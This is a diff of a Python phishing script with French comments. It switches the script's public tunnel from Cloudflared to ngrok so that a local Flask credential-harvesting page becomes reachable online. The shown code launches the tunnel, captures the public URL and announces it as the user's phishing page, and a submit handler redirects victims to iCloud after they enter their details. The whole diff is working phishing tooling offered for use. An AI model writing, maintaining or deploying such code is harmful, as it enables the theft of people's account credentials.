@@ -36,30 +36,30 @@ def submit():
     return redirect("https://www.icloud.com/")
 
 
-# Démarrer Cloudflared pour obtenir un lien public
-def start_cloudflared():
-    # Chemin vers Cloudflared (standard sous Linux)
-    cloudflared_path = "/usr/local/bin/cloudflared"
+# Démarrer Ngrok pour obtenir un lien public
+def start_ngrok():
+    # Chemin vers Ngrok (standard sous Linux)
+    ngrok_path = "/usr/local/bin/ngrok"
 
-    if not os.path.exists(cloudflared_path):
-        print(f"{RED}[!] Cloudflared n'est pas installé. Veuillez l'installer.{RESET}")
+    if not os.path.exists(ngrok_path):
+        print(f"{RED}[!] Ngrok n'est pas installé. Veuillez l'installer.{RESET}")
         exit(1)
 
-    print(f"{GREEN}[+] Démarrage de Cloudflared...{RESET}")
-    cloudflared_process = subprocess.Popen(
-        [cloudflared_path, 'tunnel', '--url', 'http://localhost:8080'],
+    print(f"{GREEN}[+] Démarrage de Ngrok...{RESET}")
+    ngrok_process = subprocess.Popen(
+        [ngrok_path, 'http', '8080'],
         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
     )
 
-    # Attendre que Cloudflared génère le lien
+    # Attendre que Ngrok génère le lien
     time.sleep(5)
-    for line in cloudflared_process.stderr:
-        if "trycloudflare.com" in line:
+    for line in ngrok_process.stderr:
+        if "ngrok" in line and "http" in line:
             public_url = line.strip().split()[-1]
-            print(f"{GREEN}[+] Lien public Cloudflared : {CYAN}{public_url}{RESET}")
+            print(f"{GREEN}[+] Lien public Ngrok : {CYAN}{public_url}{RESET}")
             return public_url
 
-    print(f"{RED}[!] Impossible d'obtenir le lien public Cloudflared.{RESET}")
+    print(f"{RED}[!] Impossible d'obtenir le lien public Ngrok.{RESET}")
     exit(1)
 
 
@@ -71,8 +71,8 @@ def start_flask():
 
 # Fonction principale
 def main():
-    # Démarrer Cloudflared et obtenir le lien public
-    public_url = start_cloudflared()
+    # Démarrer Ngrok et obtenir le lien public
+    public_url = start_ngrok()
 
     # Afficher le lien public
     print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")
@@ -82,6 +82,6 @@ def main():
 
 
 if __name__ == "__main__":
-    # Démarrer Cloudflared une seule fois
+    # Démarrer Ngrok une seule fois
     if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
         main()
